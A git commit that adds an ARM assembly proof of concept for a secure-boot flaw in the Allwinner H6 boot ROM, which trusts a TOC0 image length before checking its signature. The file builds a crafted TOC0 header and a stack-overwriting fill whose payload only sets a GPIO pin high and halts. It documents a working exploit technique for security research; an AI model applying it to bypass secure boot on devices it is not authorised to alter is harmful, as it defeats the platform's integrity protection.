c0bf74d88679a17b8342e7c67023cdf8fedb8a71
bauen1 <j2468h@gmail.com>
2020-11-20 21:56:32 +0100

    H6 SBROM exploit: Add PoC This PoC exploits the sbrom trusting the length in the toc0 before verifying the signature, allowing the stack to be overwritten.

---
+++ poc.s
@@ -0,0 +1,43 @@
+/* to build:
+arm-none-eabi-as poc.s -o poc.o && arm-none-eabi-ld -nostdlib -Ttext=0x20000 --entry=0x20000 poc.o -o poc.elf && arm-none-eabi-objcopy -O binary poc.elf poc.bin
+*/
+
+//LENGTH = 0x43000 - 0x20000
+//LENGTH = 0x10000 FEL: WORKS
+//LENGTH = 0x20000 FEL: WORKS
+//LENGTH = 0x28000 FEL: BROKEN
+//LENGTH = 0x40000 FEL: BROKEN
+//LENGTH = 0x80000 FEL: BROKEN
+LENGTH = 0x23000
+
+.ascii "TOC0.GLH"
+.word 0x89119800
+.word 0x0 /* TOC0_CHECK_SUM */
+.word 0x0 /* TOC0_SERIAL_NUM */
+.word 0x0 /* TOC0_STATUS */
+.word 0x0 /* TOC0_NUM_ITEMS */
+.word LENGTH /* TOC0_LENGTH */
+
+/* 0x20020: */
+.global _entry
+_entry:
+    /* 1. set PL7 to output */
+    ldr r0, addr
+    ldr r1, v0
+    str r1, [r0, #0x00]
+    /* 2. set output to high */
+    mov r1, #0x80
+    str r1, [r0, #0x10]
+halt:
+    b halt
+
+addr:
+.word 0x07022000
+
+v0:
+.word 0x17777777
+
+rtc_ptr:
+.word 0x07000000
+
+.fill LENGTH / 4, 4, 0x20000 + 0x20
